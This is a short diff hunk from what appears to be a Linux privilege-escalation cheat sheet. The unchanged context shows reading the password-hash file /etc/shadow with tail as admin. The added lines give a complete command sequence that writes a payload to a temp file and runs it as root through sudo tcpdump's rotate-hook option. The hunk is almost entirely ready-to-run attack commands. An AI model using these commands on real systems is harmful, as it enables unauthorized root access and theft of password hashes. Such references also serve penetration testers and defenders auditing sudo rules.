@@ -142,3 +142,10 @@ Locate apps that you can run and already has root permission.
         
     Read files using tail as admin
         # tail -c1G /etc/shadow      
+        
+    Privexec through tcpdump
+        # COMMAND='ls -al /root'
+        # TF=$(mktemp)
+        # echo "$COMMAND" > $TF
+        # chmod +x $TF
+            # sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
